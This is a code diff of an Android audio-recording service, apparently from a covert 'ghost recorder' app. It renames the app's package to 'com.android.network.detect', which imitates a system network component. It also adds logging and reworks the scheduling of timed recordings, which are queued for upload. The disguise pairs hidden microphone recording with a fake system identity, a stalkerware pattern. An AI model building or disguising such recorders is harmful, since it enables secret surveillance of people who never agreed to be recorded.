@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -8,22 +8,15 @@ import android.content.IntentFilter;
 import android.os.IBinder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
 public class AudioRecorderService extends Service {
 
-    private static AudioRecorderService sInstance;
+    private String LOG_TAG = AppGlobals.getLogTag(getClass());
     RecorderHelpers mRecorderHelpers;
     static int recordTime;
     private boolean mStoppedOnCall;
     ConnectionChangeReceiver connectionChangeReceiver;
-
-    private void setInstance(AudioRecorderService service) {
-        sInstance = service;
-    }
-
-    static AudioRecorderService getInstance() {
-        return sInstance;
-    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -33,7 +26,12 @@ public class AudioRecorderService extends Service {
             helpers.createNewEntry(SqliteHelpers.COULMN_UPLOAD, AppGlobals.getLastRecordingFilePath());
             AppGlobals.saveLastRecordingFilePath(null);
         }
-        setInstance(this);
+
+        if (intent == null) {
+            Log.v(LOG_TAG, "Service respawned");
+        } else {
+            Log.v(LOG_TAG, "Service started");
+        }
         mRecorderHelpers = new RecorderHelpers(getApplicationContext());
         mRecorderHelpers.createRecordingDirectoryIfNotAlreadyCreated();
         readSettingsAndStartRecording();
@@ -75,13 +73,25 @@ public class AudioRecorderService extends Service {
         if (delay == 0 && recordInterval == 0) {
             totalRemainingTime = (int) ((requestTime - System.currentTimeMillis()) + recordTime);
             if (totalRemainingTime > 0) {
-                mRecorderHelpers.startRecording(totalRemainingTime, null, 0);
+                mRecorderHelpers.startRecording(totalRemainingTime, 0);
             }
         } else if (delay > 0 && recordInterval > 0) {
-            int potentialTime = getCalculatedTime(recordTime, delay, recordInterval);
-            totalRemainingTime = (int) ((requestTime - System.currentTimeMillis()) + potentialTime);
-            if (totalRemainingTime > 0) {
-                mRecorderHelpers.startRecording(totalRemainingTime, delay, recordInterval);
+            int potentialRecordingSpan = getCalculatedTime(recordTime, delay, recordInterval);
+            Log.v(LOG_TAG, String.format("Potential %d", potentialRecordingSpan));
+            Log.v(LOG_TAG, String.format("Recording time %d", recordTime));
+            float recordTimePercentageInTotalSpan = ((float) recordTime / (float) potentialRecordingSpan) * 100;
+            Log.v(LOG_TAG, String.format("Record time percentage %f", recordTimePercentageInTotalSpan));
+            // Calculate how much percentage time is left for the given recording request.
+            int timeSinceRequest = (int) (System.currentTimeMillis() - requestTime);
+            Log.v(LOG_TAG, String.format("Time since request %d", timeSinceRequest));
+            int realRemainingTime = potentialRecordingSpan - timeSinceRequest;
+            Log.v(LOG_TAG, String.format("Remaining time %d", realRemainingTime));
+            if (realRemainingTime > 0) {
+                int timeToRecord = (int) (recordTimePercentageInTotalSpan * realRemainingTime) / 100;
+                Log.v(LOG_TAG, String.format("Delay %d", delay));
+                Log.v(LOG_TAG, String.format("Interval repeats %d", recordInterval));
+                Log.v(LOG_TAG, String.format("Record time %d", timeToRecord));
+                mRecorderHelpers.startRecording(timeToRecord, delay, recordInterval);
             }
         }
     }
